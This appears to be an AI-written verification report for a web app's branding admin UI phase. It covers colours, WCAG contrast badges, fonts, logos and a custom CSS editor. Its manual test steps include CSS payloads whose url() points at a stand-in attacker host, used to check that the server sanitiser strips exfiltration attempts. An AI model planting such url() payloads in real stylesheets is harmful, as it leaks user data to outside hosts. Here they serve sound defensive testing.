---
phase: 83-branding-admin-ui
verified: 2026-06-25T00:00:00Z
status: passed
score: 7/7 must-haves verified
human_verification:
  - test: "Live whole-app re-skin as colors change"
    expected: "Changing the primary accent picker instantly updates every button/focus-ring/active-swatch across the running app (sidebar, topbar, preview card) without reload"
    why_human: "jsdom cannot measure live paint or computed CSS; the setProperty path is verified in code but visual re-skin requires a browser"
  - test: "WCAG-AA badge visual appearance"
    expected: "A failing pair (e.g. light-grey text on white) shows a red/danger FAIL badge; a passing pair shows a green/success AA badge in both Dark and Light columns"
    why_human: "Badge rendering verified in unit tests; rendered color of wcag-pass/wcag-fail classes depends on var(--success)/var(--danger) values which only resolve in a real browser"
  - test: "Feel-lever observable change"
    expected: "Switching Density to Spacious visibly widens padding app-wide; toggling Glow Off removes the aurora gradient wash; Radius Round makes buttons visually rounder"
    why_human: "applyBrandTokens token mapping verified in code; visual output requires real browser paint"
  - test: "Custom CSS url() exfiltration strip"
    expected: "Pasting `a { background: url(https://evil.com/x) }` and clicking Save → the editor updates to show the declaration was stripped; stripped-declarations notice appears"
    why_human: "sanitizeCssPostcss server path is tested via routes.branding.spec.ts supertests; the client inequality check (submittedCss !== returnedCss) that shows the notice is unit-tested; the visual notice requires a running session"
---

# Phase 83: Branding Admin UI Verification Report

**Phase Goal:** A permitted admin brands the app end-to-end from one settings page — colors (dark+light) with live WCAG feedback, fonts, feel levers, live preview, Save/Reset, logo (+ optional dark override), and sanitized custom CSS — no redeploy.
**Verified:** 2026-06-25
**Status:** passed
**Re-verification:** No — initial verification

---

## Goal Achievement

### Observable Truths

| # | Truth | Status | Evidence |
|---|-------|--------|----------|
| 1 | Changing primary accent color updates :root live before Save via applyBrandTokens; draft state not persisted until Save | VERIFIED | `handleDraftChange` in BrandingSettingsPage.tsx calls `applyBrandTokens(next, theme)` synchronously on every picker `onChange`; `updateBrandConfig` is only called in `handleSave`. No store write on keystroke. |
| 2 | WCAG-AA-failing color combo shows FAIL badge in BOTH dark AND light columns; Save NOT blocked | VERIFIED | WcagBadge renders `wcag-pass`/`wcag-fail` class based on `colord` contrast ratio. Three critical pairs per column (text/bg, accent-text/accent, on-accent/#fff/accent) are rendered in both the Dark and Light column divs in BrandingSettingsPage. `disabled={!isDirty \|\| saving}` — no contrast-gate. |
| 3 | Body + display font from curated self-hosted list; live preview updates; persists through Save+reload | VERIFIED | `CURATED_BODY_FONTS` and `CURATED_DISPLAY_FONTS` in BrandingSettingsPage contain only `@fontsource-variable` families and generic stacks — no http/https URLs. Both selects call `handleDraftChange` which applies via `applyBrandTokens` → `--font-body`/`--font-display` tokens. Save PUTs the config including `fontFamily`/`displayFontFamily`. |
| 4 | Density/radius/glow/type-scale/motion controls map to real :root tokens (incl. --glow-opacity) | VERIFIED | `FeelLevers.tsx` dispatches the 5 preset fields via `onChange`. `applyBrandTokens` in brandStore calls `applyDensityPreset`/`applyRadiusPreset`/`applyMotionPreset`/`applyTypeScalePreset` helpers + the `--glow-opacity` setProperty block. `global.css` defines `--glow-opacity: 1` in `:root` and interpolates it into both dark and light body radial-gradient alphas via `calc(N * var(--glow-opacity, 1))`. |
| 5 | Pasting url() exfiltration + Save → server sanitizes; admin sees stored CSS minus the blocked declaration via "stripped declarations" notice | VERIFIED | `PUT /api/branding` calls `sanitizeCssPostcss(configObj.customCss)` (index.ts:626) before storage and returns the cleaned config. `handleSave` computes `submittedCss !== savedCss` and sets `strippedNotice` when they differ; `CustomCssEditor` renders the notice via `strippedNotice` prop. |
| 6 | BRANDUI-06 dark-logo: server schema + variant routes + logoDarkUrl in GET; Sidebar dark selection; dual logo-slot UI | VERIFIED | `brand_config` DDL has `logo_dark_data/logo_dark_mime/logo_dark_updated_at` columns + PRAGMA-guarded ALTER for Phase-81 installs. GET returns `logoDarkUrl`. POST and GET logo branch on `variant === "dark"`. Sidebar computes `effectiveLogoUrl = (theme === "dark" && logoDarkUrl) ? logoDarkUrl : logoUrl`. FOUC script in index.html reads `brand.logoDarkUrl` for dark-mode favicon. Dual slot UI with `LogoUploader` (primary + dark). |
| 7 | Leave-guard: unsaved changes prompt + revert :root to saved brand | VERIFIED | `brandPageGuard.isDirty`/`brandPageGuard.revert` are synced in a `useEffect`. App.tsx `onSelect` checks `page === "branding" && brandPageGuard.isDirty` before `setPage`; on confirm calls `brandPageGuard.revert?.()` which runs `revertToSaved()` → re-applies last-saved config. |

**Score:** 7/7 truths verified

---

### Required Artifacts

| Artifact | Status | Details |
|----------|--------|---------|
| `packages/web/src/store/brandStore.ts` | VERIFIED | Exports `applyBrandTokens`; BrandState has `revertToSaved`, `logoDarkUrl`; 4 feel-lever helpers present; `--font-display`, `--accent-text`, glow, density, radius, motion, type-scale all mapped; `logoDarkUrl` in bootstrap + update + localStorage |
| `packages/web/src/components/settings/BrandingSettingsPage.tsx` | VERIFIED | 423 lines; full 5 sections; 18 pickers; WcagBadge in both columns; FeelLevers + BrandPreviewCard wired; CustomCssEditor + LogoUploader; handleSave / handleReset complete with stripped-notice logic |
| `packages/web/src/components/settings/BrandColorPicker.tsx` | VERIFIED | Contains `HexColorPicker`; receives `onChange` wired through handleDraftChange in parent |
| `packages/web/src/components/settings/wcag.ts` | VERIFIED | `extend([a11yPlugin])` at module level; exports `contrastRatio` and `passesAA` |
| `packages/web/src/components/settings/WcagBadge.tsx` | VERIFIED | Renders `wcag-pass`/`wcag-fail` class + "FAIL"/"AA" text; threshold defaulted to 4.5; Save not blocked |
| `packages/web/src/components/settings/FeelLevers.tsx` | VERIFIED | Contains densityPreset, radiusPreset, glowEnabled, typeScaleBase, motionSpeed; 5 SegGroup/toggle groups; active class applied |
| `packages/web/src/components/settings/BrandPreviewCard.tsx` | VERIFIED | Renders button/chip/badge/input/accent-label/nav-item using existing ds-* classes; re-skins live |
| `packages/web/src/components/settings/CustomCssEditor.tsx` | VERIFIED | `kbi-brand-css-draft` separate from `kbi-custom-css`; 400ms debounced `textContent` inject; cleanup removes element on unmount; `strippedNotice` rendered |
| `packages/web/src/components/settings/LogoUploader.tsx` | VERIFIED | `onFileChosen` prop; `previewMode` class; file input accepts `image/*`; client-side preview only |
| `packages/web/src/components/settings/brandPageGuard.ts` | VERIFIED | Exports `brandPageGuard` with `isDirty: false` and `revert: null` |
| `packages/web/src/styles/global.css` | VERIFIED | `--glow-opacity: 1` in `:root`; both dark and light body radial-gradient stops use `calc(N * var(--glow-opacity, 1))` |
| `packages/web/src/api/client.ts` | VERIFIED | `BrandConfigPayload` extended with 9 new fields (displayFontFamily, accentTextColor, lightAccentTextColor, densityPreset, radiusPreset, glowEnabled, typeScaleBase, motionSpeed); `BrandingResponse.logoDarkUrl`; `updateBrandConfig` + `uploadBrandLogo(variant)` exported |
| `packages/web/src/components/Sidebar.tsx` | VERIFIED | `effectiveLogoUrl = (theme === "dark" && logoDarkUrl) ? logoDarkUrl : logoUrl`; `faPalette` Branding nav entry gated on `PERMISSIONS.BRANDING_MANAGE` |
| `packages/web/index.html` | VERIFIED | FOUC script reads `brand.logoDarkUrl`; computes `effectiveLogoUrl` for favicon with defensive fallback |
| `packages/web/src/App.tsx` | VERIFIED | Page union includes "branding"; onSelect intercept checks `brandPageGuard.isDirty`; `page === "branding" && <BrandingSettingsPage />` |
| `packages/server/src/db.ts` | VERIFIED | `logo_dark_data TEXT, logo_dark_mime TEXT, logo_dark_updated_at TEXT` in CREATE TABLE DDL; PRAGMA-guarded ALTER block for Phase-81 existing DBs |
| `packages/server/src/index.ts` | VERIFIED | GET branding returns `logoDarkUrl`; GET logo branches on `variant === "dark"`; POST logo branches on `variant === "dark"` writing dark columns; Phase-81 SVG/magic-byte validation path reused for both variants |
| `packages/server/tests/routes.branding.spec.ts` | VERIFIED | Contains "variant" and "logoDarkUrl"; dark upload 200, GET reflects logoDarkUrl, ?variant=dark serve 200, absent→404, no-permission→403, malicious SVG handled; both password + oidc auth modes (supertests confirmed passing 29/29 per test gate context) |

---

### Key Link Verification

| From | To | Via | Status | Details |
|------|----|-----|--------|---------|
| `BrandColorPicker.tsx` | `applyBrandTokens` | onChange → handleDraftChange (parent) → `applyBrandTokens(next, theme)` | WIRED | BrandColorPicker.tsx passes `onChange` from props; parent BrandingSettingsPage.tsx `handleDraftChange` calls `applyBrandTokens` on every change |
| `WcagBadge.tsx` | `wcag.ts contrastRatio()` | direct import + call | WIRED | WcagBadge imports `contrastRatio, passesAA` from `./wcag`; calls `contrastRatio(bg, fg)` and `passesAA(ratio)` |
| `FeelLevers.tsx` | `handleDraftChange` | onChange prop bubbles to BrandingSettingsPage | WIRED | `<FeelLevers draft={draft} onChange={handleDraftChange} />`; each control calls `onChange({ densityPreset: v })` etc. |
| `CustomCssEditor.tsx` | `kbi-brand-css-draft` style element | debounced `textContent` write; never touches `kbi-custom-css` | WIRED | `getDraftStyleEl()` creates/reuses `#kbi-brand-css-draft`; cleanup `useEffect` removes on unmount; grep confirms no reference to `kbi-custom-css` |
| `BrandingSettingsPage.tsx` | `updateBrandConfig + uploadBrandLogo + brandStore.update` | handleSave | WIRED | `handleSave` calls `uploadBrandLogo(draftLogoFile, "primary")` and/or `uploadBrandLogo(draftDarkLogoFile, "dark")` when files chosen, then `updateBrandConfig(draft)`, then `useBrandStore.getState().update(resp.config, newLogoUrl, newLogoDarkUrl)` |
| `App.tsx` | `brandPageGuard.isDirty` | onSelect intercept before setPage | WIRED | Lines 262-265: `if (page === "branding" && brandPageGuard.isDirty) { if (!window.confirm(...)) return; brandPageGuard.revert?.(); }` |
| `Sidebar.tsx` | `PERMISSIONS.BRANDING_MANAGE` | nav array permission filter | WIRED | nav entry `{ label: "Branding", key: "branding", icon: faPalette, permission: PERMISSIONS.BRANDING_MANAGE }`; `visibleNav = nav.filter(...)` |
| `Sidebar.tsx` | `brandStore.logoDarkUrl + theme` | `effectiveLogoUrl` computed value | WIRED | `const effectiveLogoUrl = (theme === "dark" && logoDarkUrl) ? logoDarkUrl : logoUrl;` |
| `packages/server/src/index.ts` | `logo_dark_* columns` | variant=dark UPDATE/SELECT | WIRED | POST writes `logo_dark_data/logo_dark_mime/logo_dark_updated_at`; GET SELECT includes these columns; GET logo selects dark columns when variant=dark |

---

### Requirements Coverage

| Requirement | Source Plan | Description | Status | Evidence |
|-------------|------------|-------------|--------|----------|
| BRANDUI-02 | 83-02 | Color pickers dark+light with live WCAG on critical pairs | SATISFIED | 18 BrandColorPickers in two columns; 3 WcagBadge per column (6 total); BrandColorSection.spec.tsx asserts both columns have badges |
| BRANDUI-03 | 83-02 | Body + display fonts from curated self-hosted list | SATISFIED | `CURATED_BODY_FONTS` / `CURATED_DISPLAY_FONTS` contain only @fontsource-variable families + generics; both selects wired to handleDraftChange |
| BRANDUI-04 | 83-03 | Feel levers: density/radius/glow/type-scale/motion | SATISFIED | FeelLevers.tsx has all 5 controls; applyBrandTokens maps each via 4 helpers + glow block; FeelLevers.spec.tsx 13 assertions |
| BRANDUI-05 | 83-01 + 83-03 | Live preview + Save + Reset-to-default (spans two plans per CONTEXT) | SATISFIED | handleDraftChange → applyBrandTokens (live); handleSave PUT + logo POST + store.update (persist); handleReset → applyBrandTokens({}) + setDraft({}) + setIsDirty(true) (stage Aurora defaults, not persisted); BrandPreviewCard; BrandingSave.spec.tsx |
| BRANDUI-06 | 83-04 | Optional dark-mode logo override end-to-end | SATISFIED | Server DDL + PRAGMA ALTER + variant routes + logoDarkUrl in GET; brandStore.logoDarkUrl; Sidebar effectiveLogoUrl; FOUC dark favicon; LogoUploader dual slots; handleSave uploads dark variant; routes.branding.spec.ts 29/29 |
| CSS-V116-01 | 83-03 | Custom CSS persisted + applied at runtime | SATISFIED | customCss stored via PUT; BrandStyleInjector applies saved CSS; CustomCssEditor injects live draft via kbi-brand-css-draft; stripped-declarations notice on sanitization diff |
| SECA-V116-02 | 83-02 | WCAG contrast guardrails dark AND light simultaneously, warn-only | SATISFIED | WcagBadge renders in BOTH Dark and Light columns; Save disabled only by `!isDirty \|\| saving` — not by contrast failures |
| CSS-V116-02 | (intentional partial — see note) | Injected CSS scoped so it cannot break the app shell | INTENTIONAL DIVERGENCE — NOT A GAP | Per 83-CONTEXT locked decision: custom CSS is UNSCOPED full-power; AST sanitize (Phase 81) + `id="branding-admin-exempt"` marker for Phase 84 scoping; Reset is the recovery. The `[x]` checkbox in REQUIREMENTS.md (line 42) appears incorrectly set — REQUIREMENTS.md traceability table (line 85) correctly shows "Partial (81: AST sanitize; 83: @scope)". Phase 84 closes this. |

Note: REQUIREMENTS.md traceability table row for BRANDUI-06 (line 93) still reads "Pending" — this is a documentation inconsistency (the implementation is complete and the requirement checkbox on line 37 is marked `[x]`). No code gap; cosmetic REQUIREMENTS.md update recommended for Phase 84.

---

### Anti-Patterns Found

| File | Pattern | Severity | Impact |
|------|---------|----------|--------|
| `BrandingSettingsPage.tsx:204` | Page renders but `{page === "settings"}` block still shows "Section coming soon." (App.tsx:285-287) | Info | Settings page is a separate key from Branding; this pre-existing placeholder is unrelated to Phase 83 and not a regression |
| `brandStore.ts:87` | `if (!config) return;` in applyBrandTokens — when config is null, NO :root overrides are cleared | Info | handleReset passes `{}` (empty object, not null) which correctly falls through to removeProperty calls; null is only returned early before bootstrap which is correct behavior |

No blocker anti-patterns found. No TODO/FIXME/placeholder comments in Phase 83 components. No stub implementations detected.

---

### Human Verification Required

#### 1. Live whole-app re-skin

**Test:** Open the Branding page as a branding:manage user; drag the primary accent color picker to a different hue.
**Expected:** Every button, focus ring, and active nav swatch across the sidebar, topbar, and preview card immediately reflects the new hue — no reload, no API call, before Save.
**Why human:** setProperty path is code-verified; visual re-skin requires real browser paint.

#### 2. WCAG badge visual appearance

**Test:** Set a low-contrast pair (e.g. light grey text on white background) in the Light column. Look at the badge for that pair.
**Expected:** A red/danger "FAIL" badge renders immediately; the Save button remains enabled. Fixing the contrast turns it green/success "AA".
**Why human:** Badge class rendering verified in unit tests; the visual color of `wcag-pass`/`wcag-fail` (using `var(--success)`/`var(--danger)`) requires a real browser.

#### 3. Feel-lever observable change

**Test:** Switch Density to Spacious, Radius to Round, toggle Glow Off.
**Expected:** Padding visibly widens app-wide (Spacious); buttons/inputs become rounder (Round); aurora gradient wash disappears from the background (Glow Off = `--glow-opacity: 0`).
**Why human:** Token mapping is code-verified; computed CSS visual output requires browser paint.

#### 4. Custom CSS url() exfiltration strip

**Test:** In the Custom CSS editor, paste `.evil { background: url(https://exfil.evil.com/x) }`. Click Save.
**Expected:** The stripped-declarations notice appears below the editor; the editor updates to show the sanitized CSS with the `url()` declaration removed.
**Why human:** Server sanitization tested by routes.branding.spec.ts; client inequality check unit-tested in BrandingSave.spec.tsx; the end-to-end flow (real HTTP + UI notice display) requires a running session.

---

### Gaps Summary

No gaps found. All 7 phase truths are verified. All 7 requirement IDs (BRANDUI-02/03/04/05/06, CSS-V116-01, SECA-V116-02) are satisfied by the implementation. CSS-V116-02's intentional divergence (unscoped custom CSS + branding page exempt) is a locked 83-CONTEXT decision tracked for Phase 84 — not a Phase 83 gap.

The single documentation inconsistency (REQUIREMENTS.md traceability table row for BRANDUI-06 reads "Pending" while the implementation is complete and the checkbox is marked) is cosmetic; recommend updating the traceability table row to "Complete" in Phase 84 housekeeping.

---

*Verified: 2026-06-25*
*Verifier: Claude (gsd-verifier)*
